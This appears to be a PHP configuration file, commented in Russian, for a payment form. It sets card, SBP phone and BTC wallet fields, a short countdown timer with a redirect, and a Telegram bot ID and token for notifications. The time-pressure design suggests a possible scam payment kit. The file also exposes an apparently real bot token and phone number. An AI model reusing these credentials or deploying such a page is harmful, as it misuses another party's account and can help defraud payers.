<?php
$logo = 'assets/img/logo.png'; //ссылка на логотип в основной форме

$card = 'Сюда_вписываем_номер_карты'; //Номер карты для перевода (Пример: 2202 2023 7451 5488 или 2202202374515488)

$spbphone = '+79528759687'; //Номер для SPB (Пример: +79957311896)

$cur = 'RUB'; //Валюта RUB или USD 

$btcadr = 'Сюда_вписываем_BTC_кошелек'; //Кошелек (Пример: bcewewrewrewrsfsm9h9hyvrq3g7i57cpsqw9k83lhvucvyi)

$time = 25; //Ограничение времени на форме (Время с памятью, после окончания редиректит по ссылке, которую вы укажите ниже)

$fail = '/fail.php'; // Ссылка по которой отправлять когда время вышло

$surl = '/index.php'; // Указывается ссылка на которую отправлять после нажатия кнопки (редирект через 15 сек.)

$tg_id = '962895898'; //Telegram ID 962895898 (можно получить у @GetMyId_bot)

$tg_token = '2114692826:AAGU56BDw_gYxQ9ykUasznibFNrFa0nwxgo'; //Токен бота (Пример: 2114692826:AAGU56BDw_gYxQ9ykUasznibFNrFa0nwxgo)
